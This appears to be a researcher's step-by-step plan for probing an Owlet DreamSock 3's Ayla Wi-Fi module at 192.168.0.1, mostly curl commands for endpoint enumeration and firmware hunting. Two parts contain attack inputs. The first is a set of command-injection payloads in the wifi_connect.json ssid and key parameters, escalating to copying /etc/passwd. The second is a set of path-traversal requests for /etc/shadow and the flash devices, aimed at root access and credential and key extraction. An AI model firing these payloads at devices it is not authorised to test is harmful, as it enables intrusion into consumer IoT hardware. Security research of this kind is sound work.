# Immediate Next Steps - Owlet DreamSock 3 Investigation

Based on test results from endpoint discovery, here are the high-priority next steps:

## PRIORITY 1: Investigate `/test` Endpoint

The `/test` endpoint returned **HTTP 200** - we need to see what it contains!

### Commands to Run:

```bash
# Get the full response
curl -v http://192.168.0.1/test 2>&1 | tee recon/api/test_endpoint.txt

# Try common test endpoint paths
curl -v http://192.168.0.1/test/
curl -v http://192.168.0.1/test.html
curl -v http://192.168.0.1/test.json
curl -v http://192.168.0.1/test/status
curl -v http://192.168.0.1/test/debug
curl -v http://192.168.0.1/test/cmd
curl -v http://192.168.0.1/test/exec

# Try with different HTTP methods
curl -X POST -v http://192.168.0.1/test
curl -X PUT -v http://192.168.0.1/test
curl -X DELETE -v http://192.168.0.1/test

# Try with parameters
curl -v 'http://192.168.0.1/test?cmd=help'
curl -v 'http://192.168.0.1/test?debug=1'
curl -v 'http://192.168.0.1/test?action=status'
```

## PRIORITY 2: Search for Firmware by Build ID

Now that we have the build ID `2a228da`, search for firmware:

### Search Strategies:

```bash
# 1. Google search queries to try:
#    "2a228da" ayla firmware
#    "2a228da" owlet
#    AY001MTL1 2.9.11 firmware
#    owlet dreamsock "2.9.11"

# 2. GitHub search:
#    https://github.com/search?q=2a228da
#    https://github.com/search?q=AY001MTL1

# 3. FCC database search:
#    FCC ID: 2AIEP-0BL3A
#    Look for firmware files in exhibits

# 4. Ayla Networks support:
#    Contact about AY001MTL1 module firmware 2.9.11
```

### URLs to Check:

```bash
# Possible firmware URLs (try all combinations):
curl -I https://aylanetworks.com/firmware/AY001MTL1/2.9.11/
curl -I https://aylanetworks.com/ota/AY001MTL1/2.9.11/
curl -I https://cdn.aylanetworks.com/firmware/AY001MTL1-2.9.11.bin
curl -I https://s3.amazonaws.com/ayla-firmware/AY001MTL1/2.9.11/
curl -I https://owlet.com/firmware/dreamsock/2.9.11/

# Try build-specific URLs:
curl -I https://aylanetworks.com/firmware/2a228da.bin
curl -I https://cdn.aylanetworks.com/builds/2a228da/
```

## PRIORITY 3: Enumerate More API Endpoints

Based on `/status.json` working, try related endpoints:

```bash
# Status-related endpoints
curl -v http://192.168.0.1/api_version.json
curl -v http://192.168.0.1/device.json
curl -v http://192.168.0.1/model.json
curl -v http://192.168.0.1/features.json
curl -v http://192.168.0.1/build.json
curl -v http://192.168.0.1/version.json

# Ayla-specific (from status.json features)
curl -v http://192.168.0.1/rsa.json
curl -v http://192.168.0.1/key_exchange.json
curl -v http://192.168.0.1/registration.json
curl -v http://192.168.0.1/reg_info.json

# Module-specific
curl -v http://192.168.0.1/module.json
curl -v http://192.168.0.1/module_status.json

# Time/sync endpoints
curl -v http://192.168.0.1/time.json
curl -v http://192.168.0.1/mtime.json
curl -v http://192.168.0.1/uptime.json
```

## PRIORITY 4: Test Command Injection (Delayed Execution)

Since direct command injection didn't show results, try **timing-based detection**:

```bash
# Baseline request timing
time curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=test&key=pass'

# Inject sleep command - should delay response
time curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=test`sleep 5`&key=pass'
time curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=test;sleep 5;echo test&key=pass'
time curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=test$(sleep 5)&key=pass'

# Try in key parameter
time curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=test&key=pass`sleep 5`'

# If timing shows delay, we have command injection!
# Then escalate to:
curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=test`cat /etc/passwd > /tmp/p`&key=pass'
curl http://192.168.0.1/../../tmp/p  # Try to read via path traversal
```

## PRIORITY 5: Research AY001MTL1 Module

This is the Ayla WiFi module used in the device. Research:

### Information to Find:

1. **Datasheet**: May reveal debug interfaces, UART pins, memory layout
2. **Known vulnerabilities**: Search CVE databases
3. **Default credentials**: Some modules have factory defaults
4. **Debug modes**: Manufacturing/test modes
5. **Firmware format**: How firmware is structured
6. **Update mechanism**: How OTA works

### Search Terms:

```
AY001MTL1 datasheet
AY001MTL1 pinout
AY001MTL1 UART
AY001MTL1 debug
AY001MTL1 specification
Ayla WiFi module AY001MTL1
AY001MTL1 teardown
```

## PRIORITY 6: Path Traversal via /test

If `/test` is a working endpoint, try path traversal:

```bash
# Read system files
curl -v 'http://192.168.0.1/test/../../etc/passwd'
curl -v 'http://192.168.0.1/test/../../etc/shadow'
curl -v 'http://192.168.0.1/test/../../proc/version'
curl -v 'http://192.168.0.1/test/../../proc/cmdline'
curl -v 'http://192.168.0.1/test/../../proc/self/maps'

# Try to read firmware
curl -v 'http://192.168.0.1/test/../../dev/mtdblock0' > firmware_dump_attempt.bin
curl -v 'http://192.168.0.1/test/../../dev/mtd0' > firmware_dump_attempt2.bin
```

## PRIORITY 7: Reverse Engineer the Web UI

Since we have `wifi.js`, analyze it for:

1. **Hidden parameters**: Look for commented-out features
2. **Debug flags**: Look for debug/test conditionals
3. **API calls**: Document ALL endpoint calls
4. **Authentication**: See if there's any auth we can bypass

```bash
# Search for interesting strings in wifi.js
cd /home/user/sock_hack/app
grep -i "debug" wifi.js
grep -i "test" wifi.js
grep -i "admin" wifi.js
grep -i "password" wifi.js
grep -i "auth" wifi.js
grep -i "token" wifi.js
grep -i "key" wifi.js
```

## PRIORITY 8: Monitor for Cloud Communication

Since `last_connect_mtime: 0`, the device hasn't phoned home yet. Monitor if it does:

```bash
# Run tcpdump to capture cloud communication
sudo tcpdump -i wlan0 -w recon/pcaps/cloud_communication.pcap host aylanetworks.com or port 443

# In another terminal, trigger cloud connection:
# - Successfully connect device to your WiFi
# - Device should try to reach SS3-Sleep-1a2039d9-device.aylanetworks.com

# Analyze captured traffic for:
# - Firmware update URLs
# - API endpoints
# - Authentication tokens
# - Device registration process
```

## Expected Outcomes

**If `/test` is interesting:**
- Could be a debug interface
- May reveal system information
- Might allow command execution

**If we find firmware:**
- Extract with `binwalk -e firmware.bin`
- Reverse engineer for vulnerabilities
- Find hardcoded credentials
- Locate private keys

**If command injection works:**
- Immediate root shell
- Dump firmware via `dd if=/dev/mtdblock0 of=/tmp/fw.bin`
- Explore filesystem
- Extract credentials

**If cloud communication captured:**
- Firmware download URLs
- API authentication mechanism
- Possible MITM opportunities

## Quick Reference

**Device IP**: 192.168.0.1 (AP mode)
**DSN**: AC000W025363194
**Model**: AY001MTL1
**Ayla Version**: 2.9.11
**Build ID**: 2a228da
**Build Date**: Nov 16, 2021

---

## Test Results Summary (from last session)

- ✅ `/status.json` - **WORKS** (reveals version, model, build ID)
- ✅ `/test` - **Returns 200** (need to investigate body)
- ❌ `/admin`, `/debug`, `/config`, `/system`, `/firmware`, `/update`, `/ota`, `/logs`, `/diagnostics`, `/factory` - All 404
- ⚠️ Command injection tests - **Inconclusive** (need timing-based tests)
